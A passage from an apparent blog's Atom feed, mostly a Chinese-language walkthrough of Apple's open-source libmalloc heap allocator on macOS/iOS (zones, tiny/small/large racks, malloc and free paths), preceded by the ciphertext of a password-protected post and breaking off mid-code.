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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>源码解读macOS/iOS Heap</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/深入理解macos-heap/深入理解macos-heap/</id>
    <published>2019-04-01T07:30:31.000Z</published>
    <updated>2019-04-02T05:50:15.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码解读macOS-iOS-Heap"><a href="#源码解读macOS-iOS-Heap" class="headerlink" title="源码解读macOS/iOS Heap"></a>源码解读macOS/iOS Heap</h3><blockquote><p>关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。</p></blockquote><h4 id="从malloc说起"><a href="#从malloc说起" class="headerlink" title="从malloc说起"></a>从malloc说起</h4><p><code>malloc</code>是我们经常使用的函数，这里也是<code>libmalloc.dylib</code>暴露出来的接口，另外苹果开源了<a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">libmalloc代码</a>。所以接下来我们就从源码的角度深入下去。</p><pre><code class="c">void *malloc(size_t size){    void *retval;    retval = malloc_zone_malloc(default_zone, size);    if (retval == NULL) {        errno = ENOMEM;    }    return retval;}</code></pre><p>这里实际调用了<code>malloc_zone_malloc</code>函数，传入了<code>default_zone</code>全局变量</p><pre><code class="c">static virtual_default_zone_t virtual_default_zone__attribute__((section(&quot;__DATA,__v_zone&quot;)))__attribute__((aligned(PAGE_MAX_SIZE))) = {    NULL,    NULL,    default_zone_size,    default_zone_malloc,    default_zone_calloc,    default_zone_valloc,    default_zone_free,    default_zone_realloc,    default_zone_destroy,    DEFAULT_MALLOC_ZONE_STRING,    default_zone_batch_malloc,    default_zone_batch_free,    &amp;default_zone_introspect,    10,    default_zone_memalign,    default_zone_free_definite_size,    default_zone_pressure_relief,    default_zone_malloc_claimed_address,};static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone;</code></pre><p>这里初始化了一个默认的zone，正如名字一样<code>virtual_default_zone</code>其实是一个虚假的zone，接下来是调用<code>malloc_zone_malloc</code></p><pre><code class="c">void *malloc_zone_malloc(malloc_zone_t *zone, size_t size){    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0);    void *ptr;    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) {        internal_check();    }    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) {        return NULL;    }    ptr = zone-&gt;malloc(zone, size);        // if lite zone is passed in then we still call the lite methods    if (malloc_logger) {        malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);    }    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0);    return ptr;}</code></pre><p>这里调用的<code>ptr = zone-&gt;malloc(zone, size);</code>就是<code>default_zone_malloc</code>函数</p><pre><code class="c">static void *default_zone_malloc(malloc_zone_t *zone, size_t size){    zone = runtime_default_zone();    return zone-&gt;malloc(zone, size);}</code></pre><p>这里的<code>runtime_default_zone()</code>很重要，其实这里才是去真正的初始化zone</p><pre><code class="c">runtime_default_zone   // inline----inline_malloc_default_zone  //inline--------_malloc_initialize_once  //inline ------------_malloc_initialize()</code></pre><p>下面看<code>_malloc_initialize</code>函数，去掉了一些不相干代码</p><pre><code class="c">static void_malloc_initialize(void *context __unused){    MALLOC_LOCK();    unsigned n;    malloc_zone_t *zone = NULL;    ...    zone = create_scalable_zone(0, malloc_debug_flags);    malloc_zone_register_while_locked(zone);    malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING);        initial_default_zone = zone;    if (n != 0) { // make the default first, for efficiency        unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *);        malloc_zone_t *hold = malloc_zones[0];        if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) {            malloc_set_zone_name(hold, NULL);        }        mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE);        malloc_zones[0] = malloc_zones[n];        malloc_zones[n] = hold;        mprotect(malloc_zones, protect_size, PROT_READ);    }    ...}</code></pre><p>这里主要看<code>create_scalable_zone</code>函数，所以默认的zone实际上就是scalable zone</p><pre><code class="c">malloc_zone_t *create_scalable_zone(size_t initial_size, unsigned debug_flags) {    return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags);}szone_t *create_scalable_szone(size_t initial_size, unsigned debug_flags){    szone_t *szone;    /* get memory for the zone. */    szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC);    if (!szone) {        return NULL;    }    ...    // Query the number of configured processors.    // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives    // the same behavior as the original scalable malloc. MP gets per-CPU magazines    // that scale (way) better.    unsigned int max_mags = mag_max_magazines();    uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1;    rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags);    rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags);#if CONFIG_LARGE_CACHE    // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]    szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10);    /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */    int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;);    if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) {        szone-&gt;large_legacy_reset_mprotect = TRUE;    } else {        szone-&gt;large_legacy_reset_mprotect = FALSE;    }#endif    // Initialize the security token.    szone-&gt;cookie = (uintptr_t)malloc_entropy[0];    szone-&gt;basic_zone.version = 10;    szone-&gt;basic_zone.size = (void *)szone_size;    szone-&gt;basic_zone.malloc = (void *)szone_malloc;    szone-&gt;basic_zone.calloc = (void *)szone_calloc;    szone-&gt;basic_zone.valloc = (void *)szone_valloc;    szone-&gt;basic_zone.free = (void *)szone_free;    szone-&gt;basic_zone.realloc = (void *)szone_realloc;    szone-&gt;basic_zone.destroy = (void *)szone_destroy;    szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc;    szone-&gt;basic_zone.batch_free = (void *)szone_batch_free;    szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect;    szone-&gt;basic_zone.memalign = (void *)szone_memalign;    szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size;    szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief;    szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved1 = 0;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved2 = 0;    /* Prevent overwriting the function pointers in basic_zone. */    mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ);    szone-&gt;debug_flags = debug_flags;    _malloc_lock_init(&amp;szone-&gt;large_szone_lock);    szone-&gt;cpu_id_key = -1UL; // Unused.    CHECK(szone, __PRETTY_FUNCTION__);    return szone;}</code></pre><p>这个函数分配并且初始化了szone，设置了<code>szone_malloc</code>、<code>szone_free</code>等函数</p><p>所以后面在调用<code>malloc</code>和<code>free</code>的时候实际上调用的是<code>szone_malloc</code>、<code>szone_free</code>。<code>szone_malloc</code>的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的<code>malloc_zone_*</code>进行实际的内存分配工作。</p><p>下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致</p><pre><code class="c"> *  frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone    frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482    frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18    frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77    frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103    frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24    frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109    frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37    frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396    frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197    frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68    ....</code></pre><h4 id="scalable-zone"><a href="#scalable-zone" class="headerlink" title="scalable zone"></a>scalable zone</h4><p>szone包含两个racks，分别是tiny和small rack</p><table><thead><tr><th>rack</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>tiny</td><td>&lt;= 496B</td><td>&lt;= 1008B</td></tr><tr><td>small</td><td>&lt;= 128KB</td><td>&lt;=128KB</td></tr></tbody></table><p>大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。</p><ul><li>有几个处理器，rack就有几个magazine</li><li>每个magazine有多个regions，tiny(1MB)、small(8MB)</li><li>每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region)</li></ul><p>具体可以从后面结构体中看出来其包含关系。</p><h5 id="malloc-gt-szone-malloc-gt-szone-malloc-should-clear"><a href="#malloc-gt-szone-malloc-gt-szone-malloc-should-clear" class="headerlink" title="malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear"></a>malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear</h5><pre><code class="c">MALLOC_NOINLINE void *szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested){    void *ptr;    msize_t msize;    if (size &lt;= SMALL_THRESHOLD) {        // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit)        // think tiny        msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested);    } else if (size &lt;= szone-&gt;large_threshold) {        // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS)        // think small        msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested);    } else {        // large: all other allocations        size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift;        if (num_kernel_pages == 0) { /* Overflowed */            ptr = 0;        } else {            ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested);        }    }    return ptr;}</code></pre><p>上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例</p><h5 id="tiny-malloc-should-clear"><a href="#tiny-malloc-should-clear" class="headerlink" title="tiny_malloc_should_clear"></a>tiny_malloc_should_clear</h5><pre><code class="c">void *tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested){    void *ptr;    mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines;    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested);#if DEBUG_MALLOC    if (DEPOT_MAGAZINE_INDEX == mag_index) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\n&quot;);        return (NULL);    }    if (!msize) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\n&quot;);        return (NULL);    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    ptr = tiny_mag_ptr-&gt;mag_last_free;    if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) {        // we have a winner        tiny_mag_ptr-&gt;mag_last_free = NULL;        tiny_mag_ptr-&gt;mag_last_free_msize = 0;        tiny_mag_ptr-&gt;mag_last_free_rgn = NULL;        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        CHECK(szone, __PRETTY_FUNCTION__);        if (cleared_requested) {            memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));        }#if DEBUG_MALLOC        if (LOG(szone, ptr)) {            malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\n&quot;, ptr, msize);        }#endif        return ptr;    }#endif /* CONFIG_TINY_CACHE */    while (1) {        ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);        if (ptr) {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            if (cleared_requested) {                memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));            }            return ptr;        }        if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) {            ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);            if (ptr) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                if (cleared_requested) {                    memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));                }                return ptr;            }        }        // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc().        // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first        // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section.        // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the        // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation,        // and retry-ing threads succeed in the code just above.        if (!tiny_mag_ptr-&gt;alloc_underway) {            void *fresh_region;            // time to create a new region (do this outside the magazine lock)            tiny_mag_ptr-&gt;alloc_underway = TRUE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags);            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);            // DTrace USDT Probe            MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE);            if (!fresh_region) { // out of memory!                tiny_mag_ptr-&gt;alloc_underway = FALSE;                OSMemoryBarrier();                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                return NULL;            }            ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region);            // we don&#39;t clear because this freshly allocated space is pristine            tiny_mag_ptr-&gt;alloc_underway = FALSE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            return ptr;        } else {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            yield();            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);        }    }    /* NOTREACHED */}</code></pre><p>这里的<code>if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)</code>是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从<code>ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);</code>free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。</p><h5 id="free-gt-malloc-zone-free-gt-szone-free"><a href="#free-gt-malloc-zone-free-gt-szone-free" class="headerlink" title="free-&gt;malloc_zone_free-&gt;szone_free"></a>free-&gt;malloc_zone_free-&gt;szone_free</h5><pre><code class="c">voidszone_free(szone_t *szone, void *ptr){    region_t tiny_region;    region_t small_region;#if DEBUG_MALLOC    if (LOG(szone, ptr)) {        malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\n&quot;, ptr);    }#endif    if (!ptr) {        return;    }    /*     * Try to free to a tiny region.     */    if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\n&quot;, ptr);        return;    }    if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) {        if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\n&quot;, ptr);            return;        }        free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0);        return;    }    /*     * Try to free to a small region.     */    if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\n&quot;, ptr);        return;    }    if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) {        if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\n&quot;, ptr);            return;        }        free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0);        return;    }    /* check that it&#39;s a legal large allocation */    if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\n&quot;, ptr);        return;    }    free_large(szone, ptr);}</code></pre><p>同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例</p><pre><code class="c">voidfree_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size){    msize_t msize;    boolean_t is_free;    mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region);    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size);    // ptr is known to be in tiny_region    if (known_size) {        msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1);    } else {        msize = get_tiny_meta_header(ptr, &amp;is_free);        if (is_free) {            free_tiny_botch(rack, ptr);            return;        }    }#if DEBUG_MALLOC    if (!msize) {        malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\n&quot;, ptr);        return;    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d    if (DEPOT_MAGAZINE_INDEX != mag_index) {        if (msize &lt; TINY_QUANTUM) {                      // to see if the bits fit in the last 4 bits            void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL            msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize;            region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn;            /* check that we don&#39;t already have this pointer in the cache */            if (ptr == ptr2) {                free_tiny_botch(rack, ptr);                return;            }            if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) {                memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize));            }            tiny_mag_ptr-&gt;mag_last_free = ptr;            tiny_mag_ptr-&gt;mag_last_free_msize = msize;            tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region;            if (!ptr2) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                return;            }            msize = msize2;            ptr = ptr2;            tiny_region = rgn2;        }    }#endif /* CONFIG_TINY_CACHE */    // Now in the time it took to acquire the lock, the region may have migrated    // from one magazine to another. I.e. trailer-&gt;mag_index is volatile.    // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock)    // is stale. If so, keep on tryin&#39; ...    region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region);    mag_index_t refreshed_index;    while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        mag_index = refreshed_index;        tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);        SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);    }    if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) {        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);    }    CHECK(szone, 